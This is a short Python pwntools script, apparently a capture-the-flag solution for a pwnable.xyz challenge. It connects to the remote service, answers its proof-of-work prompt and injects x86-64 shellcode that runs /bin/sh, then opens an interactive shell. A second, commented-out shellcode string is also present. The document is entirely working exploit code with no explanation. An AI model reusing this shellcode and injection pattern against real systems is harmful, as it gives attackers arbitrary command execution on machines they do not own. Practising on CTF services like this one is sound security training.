from pwn import *

context.log_level = 'debug'

#s = process("./challenge")
s = remote("svc.pwnable.xyz",30025)

#shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

pause()

s.recvuntil("POW: x + y == ")

value = int(s.recvuntil("\n").replace("\n",""),16)

s.recvuntil("> ")
s.sendline(str(value) + " " + "0")

s.recvuntil("Input: ")
s.send("\x00\x00"+shellcode)

s.interactive()
